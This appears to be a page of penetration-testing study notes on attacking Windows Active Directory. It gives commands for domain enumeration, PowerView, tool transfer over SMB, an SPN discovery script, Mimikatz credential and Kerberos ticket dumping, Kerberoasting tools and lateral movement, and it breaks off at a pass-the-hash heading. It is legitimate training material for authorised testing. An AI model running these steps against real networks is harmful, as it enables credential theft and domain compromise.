---
description: Page 623
---

# Methodology

## Enumeration

* Just landed on a box?&#x20;

```
whoami /priv
```

## Traditional Approach

Enumerate all local accounts:

```
net user
```

Enumerate all users in the entire domain:

```
net user /domain

net user jeff_admin /domain
```

Enumerate all groups in the domain:

```
net group /domain
```

## Modern Approach

Transfer Tools to compromised host

Kali:

```
impacket-smbserver smb .
```

Windows:

```
net use \\kali-ip\smb

copy \\kali-ip\smb\PowerView.ps1 .

dir

PowerView.ps1
```

Import module:

```
Import-Module .\PowerView.ps1
```

Enumerate logged-in users:

```
Get-NetLoggedon -ComputerName client251
```

Enumerate all active sessions:

```
Get-NetSession -ComputerName dc01
```

## SPNs

* An alternative to attacking a domain user account is to target so-called service accounts
* It is very possible that they are members of high-value groups

PowerShell script used to detect registered service principal names:

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
 Foreach($prop in $obj.Properties)
 {
 $prop
 }
}
```

## Authentication

### New Technology LAN Manager (NTLM)

* <mark style="color:yellow;">NTLM is used when a client authenticates to a server by IP address instead of hostname</mark>

### Kerberos

* <mark style="color:yellow;">Kerberos authentication involves the usage of a Domain Controller that is in the role of a Key Distribution Center (KDC).</mark>

### Cached Credential Storage and Completion

* Kerberos makes use of SSO password hashes
* These hashes are stored in memory space known as Local Security Authority Subsystem Service (<mark style="color:yellow;">LSASS</mark>) memory space
* <mark style="color:yellow;">If we are able to gain access to these hashes, we could take them offline and crack them to obtain the cleartext password or reuse them to perform various actions</mark>

### Mimikatz

* Transfer Mimikatz to the Windows host through our SMB server
* We will be running Mimikatz locally
* If it is acting up, it may be due to an Evil-WinRM shell
* Attempt another reverse shell if possible

Usage:

```
.\Mimikatz.exe

privilege::debug

sekurlsa::logonpasswords
```

* This should dump the credentials of all logged-on users using the Sekurlsa module
* Armed with hashes? Crack them offline and pass them around the network.

Dumping tickets in memory:

```
sekurlsa::tickets
```

* If you get a TGT or TGS, this would <mark style="color:yellow;">allow you to access particular resources associated with those tickets</mark>
* <mark style="color:yellow;">Also, if you are armed with a TGT ticket, you could request a TGS for specific resources you want to target within the domain</mark>

```
kerberos::list /export

1-40a50000-offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
```

### Kerberoasting

```
tgsrepcrack.py

impacket-GetUserSPNs
 
hashcat
```

## Lateral Movement

* Locate high-value targets
* Find workstations or servers that these targets are logged into
* Gather password hashes
* Recover existing tickets
* Leverage them for Kerberos Authentication

<mark style="color:yellow;">Do all of the above in order to use lateral movement to compromise other machines within the domain.</mark>

<mark style="color:yellow;">A logical step would be to crack any password hashes that you may have obtained and authenticate to a machine with cleartext passwords to gain access.</mark>

<mark style="color:yellow;">Can we pass the hash if password cracking is not possible?</mark>

### Pass the Hash

655





















